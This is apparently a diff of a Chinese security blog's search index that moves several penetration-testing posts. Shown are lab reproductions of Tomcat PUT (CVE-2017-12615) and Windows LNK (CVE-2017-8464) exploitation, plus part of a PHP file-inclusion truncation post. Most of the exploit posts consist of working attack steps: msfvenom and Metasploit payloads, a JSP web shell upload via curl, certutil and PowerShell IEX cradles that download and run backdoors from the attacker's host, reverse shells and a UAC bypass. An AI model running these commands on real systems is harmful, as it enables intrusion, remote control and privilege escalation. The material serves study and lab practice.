@@ -432,102 +432,6 @@ exploit
       </tags>
   </entry>
   <entry>
-    <title>一次windows渗透测试</title>
-    <url>/2021/05/06/%E4%B8%80%E6%AC%A1Windows%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<h1 id="windows内核提权实战"><a href="#windows内核提权实战" class="headerlink" title="windows内核提权实战"></a>windows内核提权实战</h1><p>kali IP:  172.16.10.111</p>
-<p>靶机IP: 172.16.10.180</p>
-<blockquote>
-<p>2021-05-06自搭环境，漏洞为Tomcat PUT （cve-2017-12615）</p>
-<p>msf使用<code>tomcat_jsp_upload_bypass</code>模块</p>
-</blockquote>
-<h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="对Web应用漏洞扫描探测"><a href="#对Web应用漏洞扫描探测" class="headerlink" title="对Web应用漏洞扫描探测"></a>对Web应用漏洞扫描探测</h3><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506212208824.png" alt="image-20210506212208824"></p>
-<blockquote>
-<p>发现服务的HTTP method方法中允许PUT，DELETE，允许客户端保存文件至服务器上</p>
-</blockquote>
-<h3 id="生成jsp反弹木马"><a href="#生成jsp反弹木马" class="headerlink" title="生成jsp反弹木马"></a>生成jsp反弹木马</h3><pre class=" language-shell"><code class="language-shell">┌──(root💀kali)-[~]
-└─# msfconsole 
-msf6 > use payload/windows/shell_bind_tcp
-msf6 payload(windows/shell_bind_tcp) > set lport 4449
-msf6 payload(windows/shell_bind_tcp) > generate -f jsp -o shell.jsp
-[*] Writing 149075 bytes to shell.jsp...
-</code></pre>
-<h3 id="上传jsp木马"><a href="#上传jsp木马" class="headerlink" title="上传jsp木马"></a>上传jsp木马</h3><blockquote>
-<p>使用curl，通过PUT方式上传<code>/test.jsp/</code>文件</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">curl -X PUT http://172.16.10.180:8080/test.jsp/ -d @shell.jsp
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506212432604.png" alt="image-20210506212432604"></p>
-<h3 id="访问Web木马"><a href="#访问Web木马" class="headerlink" title="访问Web木马"></a>访问Web木马</h3><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213004651.png" alt="image-20210506213004651"></p>
-<h3 id="使用nc连接"><a href="#使用nc连接" class="headerlink" title="使用nc连接"></a>使用nc连接</h3><pre class=" language-shell"><code class="language-shell">nc 172.16.10.180 4449
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213049337.png" alt="image-20210506213049337"></p>
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><blockquote>
-<p>在C盘下创建back目录</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">chcp 437        //将编码改为英文，不会出现乱码
-cd c:\
-mkdir back
-cd c:\back
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213421968.png" alt="image-20210506213421968"></p>
-<blockquote>
-<p>上传backdoor.exe后门</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">┌──(root💀kali)-[~]
-└─# msfpc windows 172.16.10.111
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213546472.png" alt="image-20210506213546472"></p>
-<blockquote>
-<p>python快速开启http服务</p>
-</blockquote>
-<pre class=" language-python"><code class="language-python">python3 <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">8180</span>
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213906822.png" alt="image-20210506213906822"></p>
-<blockquote>
-<p>靶机远程下载<code>backdoor.exe</code></p>
-</blockquote>
-<pre class=" language-cmd"><code class="language-cmd">certutil -urlcache -split -f http://172.16.10.111:8180/backdoor.exe
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214012023.png" alt="image-20210506214012023"></p>
-<blockquote>
-<p>kali开启监听</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">──(root💀kali)-[/home/sheng]
-└─# msfconsole -r windows-meterpreter-staged-reverse-tcp-443-exe.rc
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214303446.png" alt="image-20210506214303446"></p>
-<blockquote>
-<p>靶机执行<code>backdoor.exe</code></p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">c:\back>backdoor.exe
-backdoor.exe
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214355334.png" alt="image-20210506214355334"></p>
-<blockquote>
-<p>得到shell</p>
-</blockquote>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214422916.png" alt="image-20210506214422916"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><blockquote>
-<p>使用msf中<code>post/multi/recon/local_exploit_suggester</code>模块查看可利用的提权模块</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
-msf6 post(multi/recon/local_exploit_suggester) > set session 1
-session => 1
-msf6 post(multi/recon/local_exploit_suggester) > exploit
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214605716.png" alt="image-20210506214605716"></p>
-<blockquote>
-<p>使用<code>exploit/windows/local/bypassuac_eventvwr</code>模块进行提权</p>
-</blockquote>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214731844.png" alt="image-20210506214731844"></p>
-<p><strong>得到system权限，提权成功</strong></p>
-]]></content>
-      <tags>
-        <tag>复现</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>中国菜刀原理</title>
     <url>/2021/05/08/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
     <content><![CDATA[<h1 id="中国菜刀原理"><a href="#中国菜刀原理" class="headerlink" title="中国菜刀原理"></a>中国菜刀原理</h1><blockquote>
@@ -790,6 +694,192 @@ cd <span class="token operator">/</span>d "C<span class="token punctuation">:</s
       </tags>
   </entry>
   <entry>
+    <title>一次windows渗透测试</title>
+    <url>/2021/05/06/%E4%B8%80%E6%AC%A1Windows%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<h1 id="windows内核提权实战"><a href="#windows内核提权实战" class="headerlink" title="windows内核提权实战"></a>windows内核提权实战</h1><p>kali IP:  172.16.10.111</p>
+<p>靶机IP: 172.16.10.180</p>
+<blockquote>
+<p>2021-05-06自搭环境，漏洞为Tomcat PUT （cve-2017-12615）</p>
+<p>msf使用<code>tomcat_jsp_upload_bypass</code>模块</p>
+</blockquote>
+<h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="对Web应用漏洞扫描探测"><a href="#对Web应用漏洞扫描探测" class="headerlink" title="对Web应用漏洞扫描探测"></a>对Web应用漏洞扫描探测</h3><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506212208824.png" alt="image-20210506212208824"></p>
+<blockquote>
+<p>发现服务的HTTP method方法中允许PUT，DELETE，允许客户端保存文件至服务器上</p>
+</blockquote>
+<h3 id="生成jsp反弹木马"><a href="#生成jsp反弹木马" class="headerlink" title="生成jsp反弹木马"></a>生成jsp反弹木马</h3><pre class=" language-shell"><code class="language-shell">┌──(root💀kali)-[~]
+└─# msfconsole 
+msf6 > use payload/windows/shell_bind_tcp
+msf6 payload(windows/shell_bind_tcp) > set lport 4449
+msf6 payload(windows/shell_bind_tcp) > generate -f jsp -o shell.jsp
+[*] Writing 149075 bytes to shell.jsp...
+</code></pre>
+<h3 id="上传jsp木马"><a href="#上传jsp木马" class="headerlink" title="上传jsp木马"></a>上传jsp木马</h3><blockquote>
+<p>使用curl，通过PUT方式上传<code>/test.jsp/</code>文件</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">curl -X PUT http://172.16.10.180:8080/test.jsp/ -d @shell.jsp
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506212432604.png" alt="image-20210506212432604"></p>
+<h3 id="访问Web木马"><a href="#访问Web木马" class="headerlink" title="访问Web木马"></a>访问Web木马</h3><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213004651.png" alt="image-20210506213004651"></p>
+<h3 id="使用nc连接"><a href="#使用nc连接" class="headerlink" title="使用nc连接"></a>使用nc连接</h3><pre class=" language-shell"><code class="language-shell">nc 172.16.10.180 4449
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213049337.png" alt="image-20210506213049337"></p>
+<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><blockquote>
+<p>在C盘下创建back目录</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">chcp 437        //将编码改为英文，不会出现乱码
+cd c:\
+mkdir back
+cd c:\back
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213421968.png" alt="image-20210506213421968"></p>
+<blockquote>
+<p>上传backdoor.exe后门</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">┌──(root💀kali)-[~]
+└─# msfpc windows 172.16.10.111
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213546472.png" alt="image-20210506213546472"></p>
+<blockquote>
+<p>python快速开启http服务</p>
+</blockquote>
+<pre class=" language-python"><code class="language-python">python3 <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">8180</span>
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506213906822.png" alt="image-20210506213906822"></p>
+<blockquote>
+<p>靶机远程下载<code>backdoor.exe</code></p>
+</blockquote>
+<pre class=" language-cmd"><code class="language-cmd">certutil -urlcache -split -f http://172.16.10.111:8180/backdoor.exe
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214012023.png" alt="image-20210506214012023"></p>
+<blockquote>
+<p>kali开启监听</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">──(root💀kali)-[/home/sheng]
+└─# msfconsole -r windows-meterpreter-staged-reverse-tcp-443-exe.rc
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214303446.png" alt="image-20210506214303446"></p>
+<blockquote>
+<p>靶机执行<code>backdoor.exe</code></p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">c:\back>backdoor.exe
+backdoor.exe
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214355334.png" alt="image-20210506214355334"></p>
+<blockquote>
+<p>得到shell</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214422916.png" alt="image-20210506214422916"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><blockquote>
+<p>使用msf中<code>post/multi/recon/local_exploit_suggester</code>模块查看可利用的提权模块</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
+msf6 post(multi/recon/local_exploit_suggester) > set session 1
+session => 1
+msf6 post(multi/recon/local_exploit_suggester) > exploit
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214605716.png" alt="image-20210506214605716"></p>
+<blockquote>
+<p>使用<code>exploit/windows/local/bypassuac_eventvwr</code>模块进行提权</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214731844.png" alt="image-20210506214731844"></p>
+<p><strong>得到system权限，提权成功</strong></p>
+]]></content>
+      <tags>
+        <tag>复现</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2017-8464(快捷方式远程代码执行)漏洞复现</title>
+    <url>/2021/05/03/%E5%88%A9%E7%94%A8CVE-2017-8464%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0LNK%E6%96%87%E4%BB%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
+    <content><![CDATA[<h1 id="CVE-2017-8464-快捷方式远程代码执行"><a href="#CVE-2017-8464-快捷方式远程代码执行" class="headerlink" title="CVE-2017-8464(快捷方式远程代码执行)"></a>CVE-2017-8464(快捷方式远程代码执行)</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>微软<strong>2017年06月13日</strong>公布两个可被利用的远程代码执行漏洞其中**(CVE-2017-8464)LNK文件远程代码执行漏洞**曾被用在Stuxnet（震网病毒）软件中。Nessus在漏洞公布24小时内就已具备漏洞检查发现能力，Tenable用户只需要自动更新到最新的漏洞插件库，就能具备该漏洞发现能力。RCE漏洞存在于Windows处理LNK文件的环节。攻击者利用漏洞可以获得与本地用户相同的用户权限。被使用此漏洞攻击时，用户权限较少的账户相较管理员权限的用户受到的影响更小。</p>
+<p><strong>漏洞名称：</strong>LNK文件远程代码执行漏洞<br><strong>漏洞编号：</strong>CVE-2017-8464<br><strong>漏洞等级：</strong>严重<br><strong>漏洞概要：</strong>如果用户打开攻击者精心构造的恶意LNK文件，则会造成远程代码执行。成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。 攻击者可以通过可移动驱动器(U盘)或远程共享等方式将包含恶意LNK文件和与之相关的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。 </p>
+<p><strong>漏洞利用条件和方式：</strong>远程利用<br><strong>漏洞影响范围:</strong> </p>
+<ul>
+<li>Microsoft Windows 10 Version 1607 for 32-bit Systems</li>
+<li>Microsoft Windows 10 Version 1607 for x64-based Systems</li>
+<li>Microsoft Windows 10 for 32-bit Systems</li>
+<li>Microsoft Windows 10 for x64-based Systems</li>
+<li>Microsoft Windows 10 version 1511 for 32-bit Systems</li>
+<li>Microsoft Windows 10 version 1511 for x64-based Systems</li>
+<li>Microsoft Windows 10 version 1703 for 32-bit Systems</li>
+<li>Microsoft Windows 10 version 1703 for x64-based Systems</li>
+<li>Microsoft Windows 7 for 32-bit Systems SP1</li>
+<li>Microsoft Windows 7 for x64-based Systems SP1</li>
+<li>Microsoft Windows 8.1 for 32-bit Systems</li>
+<li>Microsoft Windows 8.1 for x64-based Systems</li>
+<li>Microsoft Windows RT 8.1</li>
+</ul>
+<blockquote>
+<p><strong>服务器系统</strong></p>
+</blockquote>
+<ul>
+<li>Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1</li>
+<li>Microsoft Windows Server 2008 R2 for x64-based Systems SP1</li>
+<li>Microsoft Windows Server 2008 for 32-bit Systems SP2</li>
+<li>Microsoft Windows Server 2008 for Itanium-based Systems SP2</li>
+<li>Microsoft Windows Server 2008 for x64-based Systems SP2</li>
+<li>Microsoft Windows Server 2012</li>
+<li>Microsoft Windows Server 2012 R2</li>
+<li>Microsoft Windows Server 2016</li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Kali： 172.16.9.195</p>
+<p>靶机：172.16.9.178</p>
+<p><strong>1、Kali生成一个ps1的反弹shell木马</strong></p>
+<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.9.195 lport=4448 -f  psh-reflection>/root/search.ps1
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503105623925.png" alt="image-20210503105623925"></p>
+<p><strong>2、Kali开启http服务，将<code>search.ps1</code>文件移动至web根目录下</strong></p>
+<pre class=" language-shell"><code class="language-shell">mv  search.ps1  /var/www/html
+systemctl start apache2
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503110302464.png" alt="image-20210503110302464"></p>
+<p><strong>3、靶机访问Kali web服务器下的<code>search.ps1</code>文件，发现可以直接访问</strong></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503110222627.png" alt="image-20210503110222627"></p>
+<p><strong>4、在靶机上创建一个PowerShell远程快捷方式</strong></p>
+<pre class=" language-powershell"><code class="language-powershell">powershell <span class="token operator">-</span>windowstyle hidden <span class="token operator">-</span>exec bypass <span class="token operator">-</span>c <span class="token string">"IEX (New-Object Net.WebClient).DownloadString('http://172.16.9.195/search.ps1');test.ps1"</span>
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503111554493.png" alt="image-20210503111554493"></p>
+<p><strong>5、Kali进行监听，靶机执行后门文件</strong></p>
+<pre class=" language-shell"><code class="language-shell">use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+show options
+set LHOST 172.16.9.195
+set lport 4448
+exploit
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503111514093.png" alt="image-20210503111514093"></p>
+<h2 id="msf模块实现"><a href="#msf模块实现" class="headerlink" title="msf模块实现"></a>msf模块实现</h2><pre class=" language-shell"><code class="language-shell">msfconsole
+search cve-2017-8464
+use exploit/windows/fileformat/cve_2017_8464_lnk_rce
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 172.16.9.195
+exploit
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503111733852.png" alt="image-20210503111733852"></p>
+<blockquote>
+<p>在/root/.msf4/local目录下生成我们的利用文件</p>
+</blockquote>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503112749608.png" alt="image-20210503112749608"></p>
+<p><strong>全部复制到移动磁盘里面(u盘拷贝)</strong></p>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/15018882278391.gif!small" alt="th.gif"></p>
+<blockquote>
+<p>然后在msf中监听</p>
+</blockquote>
+<pre class=" language-shell"><code class="language-shell">search multi/handler
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 172.16.9.195
+run
+</code></pre>
+<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503113015015.png" alt="image-20210503113015015"></p>
+]]></content>
+      <tags>
+        <tag>复现</tag>
+        <tag>LNK</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PHP代码审计基础概念</title>
     <url>/2021/04/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/</url>
     <content><![CDATA[<h1 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h1><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="代码编辑器"><a href="#代码编辑器" class="headerlink" title="代码编辑器"></a>代码编辑器</h4><ul>
@@ -913,156 +1003,6 @@ disable_functions<span class="token operator">=</span>phpinfo<span class="token 
       <tags>
         <tag>PHP</tag>
         <tag>代码审计</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2017-8464(快捷方式远程代码执行)漏洞复现</title>
-    <url>/2021/05/03/%E5%88%A9%E7%94%A8CVE-2017-8464%E6%BC%8F%E6%B4%9E%E5%AE%9E%E7%8E%B0LNK%E6%96%87%E4%BB%B6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
-    <content><![CDATA[<h1 id="CVE-2017-8464-快捷方式远程代码执行"><a href="#CVE-2017-8464-快捷方式远程代码执行" class="headerlink" title="CVE-2017-8464(快捷方式远程代码执行)"></a>CVE-2017-8464(快捷方式远程代码执行)</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>微软<strong>2017年06月13日</strong>公布两个可被利用的远程代码执行漏洞其中**(CVE-2017-8464)LNK文件远程代码执行漏洞**曾被用在Stuxnet（震网病毒）软件中。Nessus在漏洞公布24小时内就已具备漏洞检查发现能力，Tenable用户只需要自动更新到最新的漏洞插件库，就能具备该漏洞发现能力。RCE漏洞存在于Windows处理LNK文件的环节。攻击者利用漏洞可以获得与本地用户相同的用户权限。被使用此漏洞攻击时，用户权限较少的账户相较管理员权限的用户受到的影响更小。</p>
-<p><strong>漏洞名称：</strong>LNK文件远程代码执行漏洞<br><strong>漏洞编号：</strong>CVE-2017-8464<br><strong>漏洞等级：</strong>严重<br><strong>漏洞概要：</strong>如果用户打开攻击者精心构造的恶意LNK文件，则会造成远程代码执行。成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。 攻击者可以通过可移动驱动器(U盘)或远程共享等方式将包含恶意LNK文件和与之相关的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。 </p>
-<p><strong>漏洞利用条件和方式：</strong>远程利用<br><strong>漏洞影响范围:</strong> </p>
-<ul>
-<li>Microsoft Windows 10 Version 1607 for 32-bit Systems</li>
-<li>Microsoft Windows 10 Version 1607 for x64-based Systems</li>
-<li>Microsoft Windows 10 for 32-bit Systems</li>
-<li>Microsoft Windows 10 for x64-based Systems</li>
-<li>Microsoft Windows 10 version 1511 for 32-bit Systems</li>
-<li>Microsoft Windows 10 version 1511 for x64-based Systems</li>
-<li>Microsoft Windows 10 version 1703 for 32-bit Systems</li>
-<li>Microsoft Windows 10 version 1703 for x64-based Systems</li>
-<li>Microsoft Windows 7 for 32-bit Systems SP1</li>
-<li>Microsoft Windows 7 for x64-based Systems SP1</li>
-<li>Microsoft Windows 8.1 for 32-bit Systems</li>
-<li>Microsoft Windows 8.1 for x64-based Systems</li>
-<li>Microsoft Windows RT 8.1</li>
-</ul>
-<blockquote>
-<p><strong>服务器系统</strong></p>
-</blockquote>
-<ul>
-<li>Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1</li>
-<li>Microsoft Windows Server 2008 R2 for x64-based Systems SP1</li>
-<li>Microsoft Windows Server 2008 for 32-bit Systems SP2</li>
-<li>Microsoft Windows Server 2008 for Itanium-based Systems SP2</li>
-<li>Microsoft Windows Server 2008 for x64-based Systems SP2</li>
-<li>Microsoft Windows Server 2012</li>
-<li>Microsoft Windows Server 2012 R2</li>
-<li>Microsoft Windows Server 2016</li>
-</ul>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Kali： 172.16.9.195</p>
-<p>靶机：172.16.9.178</p>
-<p><strong>1、Kali生成一个ps1的反弹shell木马</strong></p>
-<pre class=" language-shell"><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.9.195 lport=4448 -f  psh-reflection>/root/search.ps1
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503105623925.png" alt="image-20210503105623925"></p>
-<p><strong>2、Kali开启http服务，将<code>search.ps1</code>文件移动至web根目录下</strong></p>
-<pre class=" language-shell"><code class="language-shell">mv  search.ps1  /var/www/html
-systemctl start apache2
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503110302464.png" alt="image-20210503110302464"></p>
-<p><strong>3、靶机访问Kali web服务器下的<code>search.ps1</code>文件，发现可以直接访问</strong></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503110222627.png" alt="image-20210503110222627"></p>
-<p><strong>4、在靶机上创建一个PowerShell远程快捷方式</strong></p>
-<pre class=" language-powershell"><code class="language-powershell">powershell <span class="token operator">-</span>windowstyle hidden <span class="token operator">-</span>exec bypass <span class="token operator">-</span>c <span class="token string">"IEX (New-Object Net.WebClient).DownloadString('http://172.16.9.195/search.ps1');test.ps1"</span>
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503111554493.png" alt="image-20210503111554493"></p>
-<p><strong>5、Kali进行监听，靶机执行后门文件</strong></p>
-<pre class=" language-shell"><code class="language-shell">use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_tcp
-show options
-set LHOST 172.16.9.195
-set lport 4448
-exploit
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503111514093.png" alt="image-20210503111514093"></p>
-<h2 id="msf模块实现"><a href="#msf模块实现" class="headerlink" title="msf模块实现"></a>msf模块实现</h2><pre class=" language-shell"><code class="language-shell">msfconsole
-search cve-2017-8464
-use exploit/windows/fileformat/cve_2017_8464_lnk_rce
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST 172.16.9.195
-exploit
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503111733852.png" alt="image-20210503111733852"></p>
-<blockquote>
-<p>在/root/.msf4/local目录下生成我们的利用文件</p>
-</blockquote>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503112749608.png" alt="image-20210503112749608"></p>
-<p><strong>全部复制到移动磁盘里面(u盘拷贝)</strong></p>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/15018882278391.gif!small" alt="th.gif"></p>
-<blockquote>
-<p>然后在msf中监听</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">search multi/handler
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set LHOST 172.16.9.195
-run
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210503113015015.png" alt="image-20210503113015015"></p>
-]]></content>
-      <tags>
-        <tag>复现</tag>
-        <tag>LNK</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含漏洞-文件包含截断</title>
-    <url>/2021/05/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%88%AA%E6%96%AD/</url>
-    <content><![CDATA[<h1 id="文件包含截断"><a href="#文件包含截断" class="headerlink" title="文件包含截断"></a>文件包含截断</h1><h2 id="利用-00截断"><a href="#利用-00截断" class="headerlink" title="利用%00截断"></a>利用<code>%00</code>截断</h2><p><code>%00</code>截断受限于<code>GPC</code>和<code>addslashes()</code>等函数。也就是说<strong>在开启GPC或者使用过滤函数过滤的情况下不能使用</strong>，在<strong>PHP 5.3</strong>之后的版本全面修复了文件名<code>%00</code>截断的问题。</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">include</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505100907925.png" alt="image-20210505100907925"></p>
-<blockquote>
-<p>当url参数被过滤时</p>
-<p><code>%00</code>被转义成了0<code>    </code>0两个单体字符，不再具有截断功能</p>
-</blockquote>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505101258523.png" alt="image-20210505101258523"></p>
-<h2 id="利用-截断"><a href="#利用-截断" class="headerlink" title="利用./截断"></a>利用<code>./</code>截断</h2><p>利用多个<code>./</code>来截断，这种方式不受限于<code>GPC</code>，但是同样在PHP 5.3版本之后被修复。</p>
-<blockquote>
-<p>在windows下使用240个点(<code>.</code>)连接可以截断</p>
-</blockquote>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
-<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">240</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-    <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'2.txt'</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
-<span class="token keyword">include</span> <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token string">'.php'</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210505104813141.png" alt="image-20210505104813141"></p>
-<blockquote>
-<p>在windows下，<code>./</code>共240个能够截断。</p>
-</blockquote>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
-<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
-    <span class="token variable">$str</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">'./'</span><span class="token punctuation">;</span>
-<span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
-<span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">'2.txt'</span><span class="token punctuation">.</span><span class="token variable">$str</span><span class="token punctuation">;</span>
